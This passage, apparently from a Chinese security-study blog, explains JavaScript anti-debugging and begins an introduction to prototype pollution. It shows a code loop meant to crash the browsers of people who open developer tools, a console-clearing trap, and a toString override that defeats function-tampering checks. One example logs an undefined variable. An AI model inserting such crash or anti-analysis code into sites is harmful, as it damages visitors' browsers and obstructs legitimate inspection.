class=&#34;built_in&#34;&gt;setInterval&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;debugger&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, &lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(c);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;内存耗尽&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#内存耗尽&#34;&gt;#&lt;/a&gt; 内存耗尽&lt;/h3&gt;
&lt;p&gt;更隐蔽的反调试手段，代码运行造成的内存占用会越来越大，很快会使浏览器崩溃。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; startTime = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Date&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;debugger&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; endTime = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Date&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; isDev = endTime - startTime &amp;gt; &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; stack = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (isDev) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        stack.&lt;span class=&#34;title function_&#34;&gt;push&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(stack.&lt;span class=&#34;property&#34;&gt;length&lt;/span&gt;, &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;清空控制台&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#清空控制台&#34;&gt;#&lt;/a&gt; 清空控制台&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;clear&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;clear&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;setTimeout&lt;/span&gt;(clear, &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;clear&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;检测函数-对象属性修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检测函数-对象属性修改&#34;&gt;#&lt;/a&gt; 检测函数、对象属性修改&lt;/h3&gt;
&lt;p&gt;攻击者在调试的时，经常会把防护的函数删除，或者把检测数据对象进行篡改。可以检测函数内容，在原型上设置禁止修改。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// eval函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    [native code]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//使用eval.toString进行内容匹配”[native code]”，可以轻易饶过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;eval&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;str&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;regexp&#34;&gt;/[native code]/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//[native code]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[native code]&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//对eval.toString进行全匹配，通过重写toString就可以绕过&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;eval&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;str&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//....&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;eval&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;toString&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            [native code]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//检测eval.toString和eval的原型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;hijacked&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;fun&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;prototype&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; fun || fun.&lt;span class=&#34;title function_&#34;&gt;toString&lt;/span&gt;().&lt;span class=&#34;title function_&#34;&gt;replace&lt;/span&gt;(&lt;span class=&#34;regexp&#34;&gt;/\n|\s/g&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) != &lt;span class=&#34;string&#34;&gt;&amp;quot;function&amp;quot;&lt;/span&gt;+fun.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;()&amp;#123;[nativecode]&amp;#125;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;一些混淆与反混淆工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一些混淆与反混淆工具&#34;&gt;#&lt;/a&gt; 一些混淆与反混淆工具&lt;/h2&gt;
&lt;p&gt;混淆工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://yui.github.io/yuicompressor/&#34;&gt;YUI Compressor &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://developers.google.com/closure/compiler/&#34;&gt;Google Closure Compiler &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/mishoo/UglifyJS&#34;&gt;UglifyJS &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://jscrambler.com/en/&#34;&gt;JScrambler &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt; // 付费，其余均为免费&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;反混淆工具：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://damilarefagbemi.com/experiments-in-js-obfuscation-deobfuscation-for-hacking-html5-apps-and-malware-analysis/jsbeautifier.org&#34;&gt;jsbeautifier.org &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://relentless-coding.org/projects/jsdetox&#34;&gt;JSDetox &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;js原型链污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js原型链污染&#34;&gt;#&lt;/a&gt; JS 原型链污染&lt;/h1&gt;
&lt;h2 id=&#34;js创建对象&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js创建对象&#34;&gt;#&lt;/a&gt; JS 创建对象&lt;/h2&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//普通方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; a = &amp;#123;&lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;pan&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;attr&#34;&gt;age&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//构造函数方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;a&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;pan&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;age&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.&lt;span class=&#34;property&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;prototype&lt;/span&gt;&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;wang&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//赋值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;a&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(web.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//调用&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//object方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; a = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;pan&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a.&lt;span class=&#34;property&#34;&gt;age&lt;/span&gt; = &lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;js继承机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#js继承机制&#34;&gt;#&lt;/a&gt; JS 继承机制&lt;/h2&gt;
&lt;p&gt;JS 没有 java 中的 class，它通过 &lt;code&gt;prototype&lt;/code&gt;  实现继承&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Js&#34;&gt;&lt;figure class=&#34;iseeu highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Dog&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;name&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt; = name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title class_&#34;&gt;Dog&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;prototype&lt;/span&gt;&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;bark&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;console&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;log&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;this&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;name&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; dogA = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Dog&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Rover&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; dogB = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Dog&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Fido&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dogA.&lt;span class=&#34;title function_&#34;&gt;bark&lt;/span&gt;(); &lt;span class=&#34;comment&#34;&gt;// Rover&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dogB.&lt;span class=&#34;title function_&#34;&gt;bark&lt;/span&gt;(); &lt;span class=&#34;comment&#34;&gt;// Fido&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;万物皆对象proto&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#万物皆对象proto&#34;&gt;#&lt;/a&gt; 万物皆对象 &amp;amp; proto&lt;/h3&gt;
&lt;p&gt;在 js 中所有的东西都可看为对象。&lt;/p&gt;
&lt;p&gt;而在 js 中每一个对象都会有一个 &lt;code&gt;__proto__&lt;/code&gt; 的属性。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;__proto__&lt;/code&gt; &lt;br&gt;
对象可以通过 &lt;code&gt;__proto__&lt;/code&gt; 来找到其自己的父类。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而对于构造函数也有一个&lt;strong&gt; prototype&lt;/strong&gt; 与之相对应。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;prototype&lt;/code&gt; &lt;br&gt;
 构造函数 &lt;code&gt;prototype&lt;/code&gt;  也是一个对象，为构造函数的原型对象&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;constructor-构造函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#constructor-构造函数&#34;&gt;#&lt;/a&gt; constructor 构造函数&lt;/h3&gt;
